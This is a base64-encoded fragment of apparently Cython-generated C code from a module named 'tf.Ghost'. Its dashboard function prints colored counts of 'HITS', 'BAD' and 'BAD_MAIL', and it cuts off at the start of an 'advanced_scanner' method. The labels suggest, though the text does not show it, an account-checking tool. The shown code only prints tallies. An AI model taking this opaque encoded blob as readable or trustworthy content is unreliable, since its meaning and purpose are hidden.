KF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDQyNiwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CgogIAogIF9fcHl4X3RfMyA9IE5VTEw7CiAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogIF9fcHl4X3RfMiA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAoKICAKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MjgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR1JFRU4pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MjgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MjgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0X2NvdW50ZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MjgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMF0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0MjgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MjgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQyk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQyOCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SRVNFVCk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDQyOCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQyOCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgX19weXhfdF85WzBdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTE7CiAgX19weXhfdF85WzFdID0gX19weXhfdF81OwogIF9fcHl4X3RfOVsyXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfSElUUzsKICBfX3B5eF90XzlbM10gPSBfX3B5eF90XzY7CiAgX19weXhfdF85WzRdID0gX19weXhfdF83OwogIF9fcHl4X3RfOVs1XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzEyOwogIF9fcHl4X3RfOCA9IF9fUHl4X1B5VW5pY29kZV9Kb2luKF9fcHl4X3RfOSwgNiwgNyArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNSkgKyAxMSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNikgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzcpICsgOCwgMTI3IHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF82KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzcpKTsKICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA0MjgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogIF9fcHl4X3RfNCA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMywgX19weXhfdF84fTsKICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF80LCAoMi1fX3B5eF90XzQpIHwgKF9fcHl4X3RfNCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA0MjcsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwoKICAKICBfX3B5eF90XzIgPSBOVUxMOwogIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTsKICBfX3B5eF90XzggPSBfX3B5eF9idWlsdGluX3ByaW50OyAKCiAgCiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9DKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDMwLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1JFRCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQzMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDQzMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXRfY291bnRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQzMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIxXSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQzMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQzMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9DKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDMwLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1JFU0VUKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDMwLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDMwLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICBfX3B5eF90XzlbMF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xMTsKICBfX3B5eF90XzlbMV0gPSBfX3B5eF90XzM7CiAgX19weXhfdF85WzJdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9CQUQ7CiAgX19weXhfdF85WzNdID0gX19weXhfdF83OwogIF9fcHl4X3RfOVs0XSA9IF9fcHl4X3RfNjsKICBfX3B5eF90XzlbNV0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xMjsKICBfX3B5eF90XzUgPSBfX1B5eF9QeVVuaWNvZGVfSm9pbihfX3B5eF90XzksIDYsIDcgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzMpICsgMTEgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzcpICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF82KSArIDgsIDEyNyB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzMpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNykgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF82KSk7CiAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDMwLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICBfX3B5eF90XzQgPSAxOwogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIsIF9fcHl4X3RfNX07CiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzgsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDItX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNDI5LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIH0KICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKCiAgCiAgX19weXhfdF84ID0gTlVMTDsKICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7CiAgX19weXhfdF81ID0gX19weXhfYnVpbHRpbl9wcmludDsgCgogIAogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQyk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQzMiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9ZRUxMT1cpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MzIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0MzIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0X2NvdW50ZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MzIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMl0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0MzIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MzIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQyk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQzMiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SRVNFVCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDQzMiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQzMiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgX19weXhfdF85WzBdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTE7CiAgX19weXhfdF85WzFdID0gX19weXhfdF8yOwogIF9fcHl4X3RfOVsyXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfQkFEX01BSUw7CiAgX19weXhfdF85WzNdID0gX19weXhfdF82OwogIF9fcHl4X3RfOVs0XSA9IF9fcHl4X3RfNzsKICBfX3B5eF90XzlbNV0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xMjsKICBfX3B5eF90XzMgPSBfX1B5eF9QeVVuaWNvZGVfSm9pbihfX3B5eF90XzksIDYsIDcgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzIpICsgMTEgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzYpICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF83KSArIDgsIDEyNyB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzIpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNikgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF83KSk7CiAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDMyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICBfX3B5eF90XzQgPSAxOwogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzgsIF9fcHl4X3RfM307CiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDItX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNDMxLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIH0KICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKCiAgCiAgX19weXhfdF81ID0gTlVMTDsKICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7CiAgX19weXhfdF8zID0gX19weXhfYnVpbHRpbl9wcmludDsgCiAgX19weXhfdF80ID0gMTsKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xM307CiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzMsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDItX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDQzMywgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CgogIAoKICAKICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpOwogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsKICBfX1B5eF9BZGRUcmFjZWJhY2soInRmLkdob3N0LmNyZWF0ZV9kYXNoYm9hcmQiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX3B5eF9yID0gTlVMTDsKICBfX3B5eF9MMDo7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnRmXzVHaG9zdF8yOWFkdmFuY2VkX3NjYW5uZXIoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCik7IApzdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8ydGZfNUdob3N0XzI5YWR2YW5jZWRfc2Nhbm5lciA9IHsiYWR2YW5jZWRfc2Nhbm5lciIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMnRmXzVHaG9zdF8yOWFkdmFuY2VkX3NjYW5uZXIsIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07CnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnRmXzVHaG9zdF8yOWFkdmFuY2VkX3NjYW5uZXIoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCikgewogIFB5T2JqZWN0ICpfX3B5eF92X3NlbGYgPSAwOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7CiAgI2VuZGlmCiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzOwogIFB5T2JqZWN0KiB2YWx1ZXNbMV0gPSB7MH07CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBQeU9iamVjdCAqX19weXhfciA9IDA7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiYWR2YW5jZWRfc2Nhbm5lciAod3JhcHBlcikiLCAwKTsKICAjaWYgIUNZVEhPTl9N